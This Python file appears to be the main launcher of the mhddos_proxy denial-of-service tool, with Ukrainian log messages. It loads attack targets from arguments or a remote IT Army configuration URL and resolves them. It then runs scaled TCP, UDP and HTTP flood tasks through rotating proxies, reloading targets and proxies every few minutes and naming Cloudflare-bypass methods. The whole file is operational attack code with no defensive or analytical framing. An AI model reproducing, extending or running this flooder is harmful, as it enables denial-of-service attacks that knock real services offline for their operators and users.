# @formatter:off
import colorama; colorama.init()
# @formatter:on
import asyncio
import time
from threading import Event, Thread
from typing import Optional, Union

from src.cli import init_argparse
from src.concurrency import safe_run
from src.core import (
    logger, cl, Params, Stats,
    LOW_RPC, IT_ARMY_CONFIG_URL, REFRESH_RATE, UVLOOP_SUPPORT,
    FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS,
)
from src.dns_utils import resolve_all_targets
from src.mhddos import main as mhddos_main, AsyncTcpFlood, AsyncUdpFlood
from src.output import show_statistic, print_banner
from src.proxies import ProxySet
from src.system import fix_ulimits, is_latest_version
from src.targets import TargetsLoader


class FloodTask:

    def __init__(self, runnable: Union[AsyncTcpFlood, AsyncUdpFlood], scale: int = 1):
        self._runnable = runnable
        self._scale = scale
        self._failure_budget = scale * FAILURE_BUDGET_FACTOR
        self._failure_budget_delay = FAILURE_DELAY_SECONDS

    def _launch_task(self):
        return asyncio.create_task(safe_run(self._runnable.run))

    async def loop(self):
        tasks = set(self._launch_task() for _ in range(self._scale))
        num_failures = 0
        while tasks:
            done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            for f in done:
                num_failures += int(not f.result())
                if num_failures >= self._failure_budget:
                    await asyncio.sleep(self._failure_budget_delay)
                    num_failures = 0
                pending.add(self._launch_task())
            tasks = pending


async def run_ddos(
    proxies: Optional[ProxySet],
    targets_loader,
    reload_after,
    rpc,
    http_methods,
    vpn_mode,
    debug,
    table,
    total_threads,
):
    statistics = {}

    # initial set of proxies
    if proxies is not None:
        num_proxies = await proxies.reload()
        if num_proxies == 0:
            logger.error(f"{cl.RED}Не знайдено робочих проксі - зупиняємо атаку{cl.RESET}")
            exit()

    # XXX: we don't need "params"
    def prepare_params(params):
        thread_statistics = Stats()
        statistics[params] = thread_statistics
        kwargs = {
            'url': params.target.url,
            'ip': params.target.addr,
            'method': params.method,
            'rpc': int(params.target.option("rpc", "0")) or rpc,
            'event': None,
            'stats': thread_statistics,
            'proxies': proxies,
        }
        if not (table or debug):
            logger.info(
                f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
                % (params.target.url.host, params.target.url.port, params.method)
            )
        return kwargs

    logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
    if not (table or debug):
        # Keep the docs/info on-screen for some time before outputting the logger.info above
        await asyncio.sleep(5)

    flooders = []

    async def load_targets():
        targets, changed = await targets_loader.load()
        targets = await resolve_all_targets(targets)
        return [target for target in targets if target.is_resolved], changed

    async def install_targets(targets):
        nonlocal flooders

        # cancel running flooders
        if flooders:
            for task in flooders:
                task.cancel()
            flooders = []

        statistics.clear()

        kwargs_list = []
        for target in targets:
            assert target.is_resolved, "Unresolved target cannot be used for attack"
            # udp://, method defaults to "UDP"
            if target.is_udp:
                kwargs_list.append((prepare_params(Params(target, target.method or 'UDP')), 0))
            # Method is given explicitly
            elif target.method is not None:
                kwargs_list.append((prepare_params(Params(target, target.method)), 1))
            # tcp://
            elif target.url.scheme == "tcp":
                kwargs_list.append((prepare_params(Params(target, 'TCP')), 1))
            # HTTP(S), methods from --http-methods
            elif target.url.scheme in {"http", "https"}:
                for method in http_methods:
                    kwargs_list.append((prepare_params(Params(target, method)), 1))
            else:
                logger.error(f"Unsupported scheme given: {target.url.scheme}")

        num_tcp_flooders = sum(pair[1] for pair in kwargs_list)
        scale = max(1, (total_threads // num_tcp_flooders) if num_tcp_flooders > 0 else 0)

        for kwargs, is_tcp in kwargs_list:
            runnable = mhddos_main(**kwargs)
            task = asyncio.create_task(FloodTask(runnable, scale if is_tcp else 1).loop())
            # XXX: add stats for running/cancelled tasks with add_done_callback
            flooders.append(task)

    try:
        initial_targets, _ = await load_targets()
    except Exception as exc:
        logger.error(f"{cl.RED}Завнтаження цілей завершилося помилкою: {exc}{cl.RESET}")
        initial_targets = []

    if not initial_targets:
        logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
        exit()
    await install_targets(initial_targets)

    tasks = []

    async def stats_printer():
        ts = time.time()
        while True:
            await asyncio.sleep(REFRESH_RATE)
            try:
                passed = time.time() - ts
                ts = time.time()
                num_proxies = 0 if proxies is None else len(proxies)
                show_statistic(
                    statistics,
                    REFRESH_RATE,
                    table,
                    vpn_mode,
                    num_proxies,
                    reload_after,
                    passed
                )
            except:
                ts = time.time()

    # setup coroutine to print stats
    tasks.append(asyncio.ensure_future(stats_printer()))

    async def reload_targets(delay_seconds: int = 30):
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                targets, changed = await load_targets()
                if not targets:
                    logger.warning(
                        f"{cl.RED}Не знайдено жодної доступної цілі - "
                        f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
                    )
                elif not changed:
                    logger.warning(
                        f"{cl.YELLOW}Перелік цілей не змінився - "
                        f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
                    )
                else:
                    await install_targets(targets)
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                logger.warning(
                    f"{cl.MAGENTA}Не вдалося (пере)завантажити конфіг цілей: {exc}{cl.RESET}")
            finally:
                logger.info(
                    f"{cl.YELLOW}Оновлення цілей через: "
                    f"{cl.BLUE}{delay_seconds} секунд{cl.RESET}"
                )

    # setup coroutine to reload targets (if configuration file is given)
    if targets_loader.dynamic:
        tasks.append(asyncio.ensure_future(reload_targets(delay_seconds=reload_after)))

    async def reload_proxies(delay_seconds: int = 30):
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                num_proxies = await proxies.reload()
                if num_proxies == 0:
                    logger.warning(
                        f"{cl.MAGENTA}Буде використано попередній список проксі{cl.RESET}")
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            finally:
                logger.info(
                    f"{cl.YELLOW}Оновлення проксей через: "
                    f"{cl.BLUE}{delay_seconds} секунд{cl.RESET}"
                )

    # setup coroutine to reload proxies
    if proxies is not None:
        tasks.append(asyncio.ensure_future(reload_proxies(delay_seconds=reload_after)))

    await asyncio.gather(*tasks, return_exceptions=True)


async def start(args, shutdown_event: Event):
    print_banner(args.vpn_mode)
    fix_ulimits()

    if args.table:
        args.debug = False

    for bypass in ('CFB', 'DGB'):
        if bypass in args.http_methods:
            logger.warning(
                f'{cl.RED}Робота методу {bypass} не гарантована - атака методами '
                f'за замовчуванням може бути ефективніша{cl.RESET}'
            )

    if args.rpc < LOW_RPC:
        logger.warning(
            f'{cl.YELLOW}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
            f'через збільшення кількості перепідключень{cl.RESET}'
        )

    is_old_version = not await is_latest_version()
    if is_old_version:
        logger.warning(
            f"{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: "
            "https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n"
        )

    if args.itarmy:
        targets_loader = TargetsLoader([], IT_ARMY_CONFIG_URL)
    else:
        targets_loader = TargetsLoader(args.targets, args.config)

    # we are going to fetch proxies even in case we have only UDP
    # targets because the list of targets might change at any point in time
    no_proxies = args.vpn_mode
    proxies = None if no_proxies else ProxySet(args.proxies)

    # XXX: with the current implementation there's no need to
    # have 2 separate functions to setups params for launching flooders
    reload_after = 300
    await run_ddos(
        proxies,
        targets_loader,
        reload_after,
        args.rpc,
        args.http_methods,
        args.vpn_mode,
        args.debug,
        args.table,
        args.threads,
    )
    shutdown_event.set()


if __name__ == '__main__':
    if UVLOOP_SUPPORT:
        try:
            __import__("uvloop").install()
            logger.info(
                f"{cl.GREEN}uvloop{cl.RESET} успішно активований "
                "(підвищенна ефективність роботи з мережею)")
        except Exception:
            pass

    args = init_argparse().parse_args()
    shutdown_event = Event()
    try:
        # run event loop in a separate thread to ensure the application
        # exists immediately after Ctrl+C
        Thread(target=lambda: asyncio.run(start(args, shutdown_event)), daemon=True).start()
        # we can do something smarter rather than waiting forever,
        # but as of now it's gonna be consistent with previous version
        shutdown_event.wait()
    except KeyboardInterrupt:
        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
